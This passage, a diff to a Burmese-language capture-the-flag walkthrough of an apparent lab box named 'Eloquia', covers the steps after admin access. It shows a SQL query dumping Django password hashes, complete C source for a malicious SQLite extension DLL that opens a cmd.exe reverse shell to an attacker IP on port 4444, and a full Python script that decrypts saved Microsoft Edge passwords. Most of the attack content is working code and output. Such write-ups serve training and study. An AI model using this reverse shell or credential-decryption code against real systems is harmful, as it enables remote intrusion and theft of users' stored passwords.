@@ -143,3 +143,204 @@ formData.comment='y0uG0tME';submitForm() အပေါ်မှာရှင်း
 
 boom! admin cookie ရပြီဆိုတော့ admin panel ထဲ၀င်လိုက်ရအောင် cookies သုံးပြီး ဘယ်လိုသုံးရမလဲဆို right click -> inspect -> application -> cookies မှာရလာတဲ့ဟာတွေ အစားထိုးလိုက်ရုံပါပဲ 
 
+![image](/images/eloquia/12.png)
+
+Admin Panel ထဲကို၀င်လိုက်တဲ့အချိန်မှာ 
+
+![image](/images/eloquia/12.png)
+
+sql explorer ကိုတွေ့ပါလိမ့်မယ် sql explorer နဲ့ query ကစားကြည့်လိုက်ရအောင် 
+![image](/images/eloquia/13.png)
+
+```sql
+SELECT sqlite_version();
+3.45.1
+
+SELECT name FROM sqlite_master WHERE type='table';
+django_session
+Eloquia_customuser
+explorer_queryfavorite
+explorer_explorervalue
+
+SELECT * FROM Eloquia_customuser;
+admin:pbkdf2_sha256$720000$gOf8IANRduHfMKSJBF6lxr$i8gRr6EY+rn05XMFeHexWEk36RCLgtsawMXMKgwIgZ4=
+Olivia.KAT:pbkdf2_sha256$720000$l0PVHno3vDtBJLVyPRaKhM$Yu/cqsv51M7IM74zIgz2d3Zeec0frPXT/ulVaVQwr1U=
+```
+ဘာလို့ admin နဲ့ Olivia.KAT ကိုပဲ crack လဲဆိုရင် သူတို့က is_superuser တွေမလို့ပါ အဲ့ဒီတော့ ကျနော် crack ကြည့်လိုက်တဲ့အချိန်မှာ လုံး၀မရပါဘူး နောက်တစ်နည်းရှာကြည့်လိုက်တဲ့အချိန်မှာ 
+
+![image](/images/eloquia/14.png)
+
+အဲ့ဒီတော့ enable_load_extension=true ဆိုရင် rce ဖြစ်လို့ရတယ်ဆိုတော့ တစ်ချက်ကြည့်လိုက်ရအောင် enabled ဖြစ်မဖြစ် 
+
+![image](/images/eloquia/15.png)
+
+> The specified module could not be found. 
+စစ်လိုက်တဲ့အချိန်မှာ enabled ဖြစ်နေပါတယ်  ဒီ error ကသက်သေပြနေတာပါ  
+
+အဲ့ဒီတော့က reverse shell ယူလိုက်ရအောင် load_extension က dll file ကို accept တော့ dll နဲ့ reverse shell ယူကြပါမယ် admin panel မှာဆိုရင် articles တွေ့ပါလိမ့်မယ် articles ထဲက တစ်ခုကို dll file upload ပါမယ် 
+
+![image](/images/eloquia/16.png)
+
+rev_sql.dll ကိုတင်ထားပါတယ် အဲ့ဒီတော့က rev_sql.c file ပေးပါမယ်
+
+```c
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+__declspec(dllexport) int sqlite3_extension_init(
+    void *db,
+    char **pzErrMsg,
+    void *pApi
+){
+    WSADATA wsaData;
+    SOCKET s;
+    struct sockaddr_in sa;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr("10.10.16.xx");
+    sa.sin_port = htons(4444);
+
+    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
+        memset(&si, 0, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES;
+        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+
+        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    closesocket(s);
+    WSACleanup();
+
+    return 0;
+}
+```
+10.10.16.xx နေရာမှာကိုယ့်ရဲ့ ip ပြောင်းဖို့မမေ့ပါနဲ့ အဲ့ဒီတော့ sql query ကနေ load extension နဲ့ execute  ပါမယ် 
+
+![image](/images/eloquia/17.png)
+
+အဲ့ဒါလုပ်ပြီးသွားရင် query ကို refresh လုပ်ပြီး run လိုက်ရအောင်
+
+![image](/images/eloquia/18.jpg)
+
+boom!!! reverse shell လေးရလာပါပြီ အဲ့ဒီတော့ user flag လေးပါယူလိုက်ရအောင် 
+
+![image](/images/eloquia/19.jpg)
+
+အဲ့ဒီနောက်ပိုင်း ကျနော် recon နေရင်း microsoftedgeupdate.exe ကိုတွေ့လိုက်ပါတယ်အဲ့ဒီတော့က ကျနော်စဥ်းစားမိတာ user တစ်ယောက်ယောက်ရဲ့ credential ကို browser ကနေယူလို့ရလောက်လားဆိုတာ recon ရင်း c:\users\web ရဲ့ folder တွေထဲမှာ browser password decrypt လို့ရမဲ့ files Local State and Login Data files တွေကိုတွေ့လိုက်ရပါတယ် အဲ့ဒီတော့က browser decrypt လိုက်ရအောင် 
+
+![image](/images/eloquia/20.jpg)
+
+![image](/images/eloquia/21.jpg)
+
+boom! we got creds အဲ့လိုနဲ့ olivia.kat ရဲ့ cred ကိုရလာပါတယ် browser_decrypt.py ရဲ့ script လေးကတော့ 
+
+```python
+#!/usr/bin/env python3
+
+import os
+import json
+import base64
+import shutil
+import sqlite3
+import sys
+import io
+from Crypto.Cipher import AES
+import win32crypt
+
+sys.stdout = io.TextIOWrapper(
+    sys.stdout.buffer,
+    encoding="utf-8",
+    errors="replace",
+    line_buffering=True
+)
+
+
+EDGE_BASE = os.path.join(
+    os.environ["LOCALAPPDATA"],
+    "Microsoft", "Edge", "User Data"
+)
+
+LOCAL_STATE = os.path.join(EDGE_BASE, "Local State")
+LOGIN_DATA = os.path.join(EDGE_BASE, "Default", "Login Data")
+TMP_DB = os.path.join(os.environ["TEMP"], "edge_login_tmp.db")
+
+
+def get_encryption_key():
+    with open(LOCAL_STATE, "r", encoding="utf-8") as f:
+        state = json.load(f)
+
+    key = base64.b64decode(state["os_crypt"]["encrypted_key"])
+    key = key[5:]  # remove DPAPI prefix
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_password(enc_pwd, key):
+    try:
+        # Modern AES-GCM (starts with b'v10')
+        if enc_pwd.startswith(b"v10"):
+            nonce = enc_pwd[3:15]
+            ciphertext = enc_pwd[15:]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt(ciphertext)[:-16]
+        else:
+            # Legacy DPAPI
+            decrypted = win32crypt.CryptUnprotectData(
+                enc_pwd, None, None, None, 0
+            )[1]
+
+        # Decode to UTF-8 with fallback
+        password = decrypted.decode("utf-8", errors="replace")
+
+        # Reject unreadable output
+        if any(c in password for c in ['�', '\x00']):
+            return "ERROR: Unreadable or corrupt password"
+
+        return password
+
+    except Exception as e:
+        return f"ERROR: {e}"
+
+
+def main():
+    if not os.path.exists(LOGIN_DATA):
+        print("[-] Edge Login Data not found")
+        return
+
+    key = get_encryption_key()
+    shutil.copy2(LOGIN_DATA, TMP_DB)
+
+    conn = sqlite3.connect(TMP_DB)
+    cursor = conn.cursor()
+
+    cursor.execute("""
+        SELECT origin_url, username_value, password_value
+        FROM logins
+        WHERE username_value != ''
+    """)
+
+    for url, user, enc_pwd in cursor.fetchall():
+        password = decrypt_password(enc_pwd, key)
+        print(f"{url}|{user}|{password}")
+
+    conn.close()
+    os.remove(TMP_DB)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+ဒါကတော့ windows ရဲ့ python.exe နဲ့ decrypt ထားတာပါ sliver-c2 ရဲ့ sharpchrome သုံးပြီး decrypt ထားတာလေးလည်းပြပါမယ် 
+
+![image](/images/eloquia/22.jpg)
